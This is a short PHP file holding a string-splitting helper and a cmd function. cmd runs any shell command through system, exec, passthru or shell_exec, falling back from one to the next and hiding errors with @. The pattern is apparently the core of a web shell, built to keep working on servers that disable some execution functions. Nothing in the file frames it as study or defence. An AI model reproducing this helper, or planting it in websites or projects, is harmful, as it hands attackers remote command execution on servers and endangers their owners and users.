<?php

function getStr($pemisah,$string){
    return explode(chr(1),str_replace($pemisah,chr(1),$string));
}

function cmd($command){
    if(function_exists('system')){
        @ob_start();
        @system($command);
        $result = @ob_get_contents();
        @ob_end_clean();
        return $result;
    }elseif(function_exists('exec')){
        @exec($command,$result);
        $result = @join("\n",$result);
        return $result;
    }elseif(function_exists('passthru')){
        @ob_start();
        @passthru($command);
        $result = @ob_get_contents();
        @ob_end_clean();
        return $result;
    }elseif(function_exists('shell_exec')){
        $result = @shell_exec($command);
        return $result;
    }
}